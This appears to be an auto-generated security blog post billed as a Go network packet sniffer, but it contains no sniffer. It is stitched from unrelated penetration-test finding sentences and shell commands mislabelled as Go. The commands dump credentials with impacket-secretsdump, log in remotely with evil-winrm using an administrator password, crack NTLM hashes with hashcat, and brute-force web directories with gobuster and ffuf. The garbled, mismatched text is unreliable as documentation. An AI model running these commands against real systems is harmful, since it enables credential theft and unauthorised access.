---
TitleSEO: "Network Packet Sniffer in Go | ZureFX"
TitlePost: "Network Packet Sniffer — Go"
Author: "ZureFX"
Description: "A Go script for network packet sniffer. Built for security research and automation."
Keywords: "bash, scanner, rust, tool, automation, go"
URL: "https://zurefx.github.io/scripting/script-network-packet-sniffer-393.html"
URL_IMAGES: ""
Date: "2026-03-21"
Tags: "Bash, Scanner, Rust, Tool, Automation, Go"
Section: "scripting"
Lang: "en"
main_img: "script-network-packet-sniffer-393"
Permalink: "/scripting/script-network-packet-sniffer-393.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

The application stored sensitive credentials in an unencrypted configuration file. Token impersonation allowed elevation to SYSTEM privileges on the target. The application stored sensitive credentials in an unencrypted configuration file.

Built with **Go** for offensive security automation.

### Requirements

- Go
- `smbclient`
- `socat`
- `hydra`

## Implementation

### Core Logic

The kernel version was outdated and vulnerable to a publicly known exploit. The target system was identified as running a vulnerable version of the service.

```go
impacket-secretsdump administrator:'P@ssw0rd!'@10.91.143.123
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

Authentication bypass was achieved through careful manipulation of the login mechanism. Group Policy Preferences contained encrypted but recoverable credentials.

### Helper Functions

The kernel version was outdated and vulnerable to a publicly known exploit. The service account had excessive permissions assigned in Active Directory.

```go
evil-winrm -i 10.73.170.221 -u administrator -p 'P@ssw0rd!'
gobuster dir -u http://10.116.250.25/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

## Usage

### Basic Usage

The target system was identified as running a vulnerable version of the service. The service was running without proper input validation, leading to injection vulnerabilities.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.40.18.150/FUZZ
```

### Advanced Options

The database credentials were hardcoded in the application source code. Post-exploitation enumeration revealed a path to domain administrator privileges. The backup files contained sensitive information that should not have been accessible.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.12.87.228/FUZZ
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

## Output

### Example Output

The web application was vulnerable to Server-Side Template Injection (SSTI). Privilege escalation was possible due to misconfigured sudo permissions.

```
[+] Scanning target...
[+] Found 11 results
[+] Done in 2.14s
```
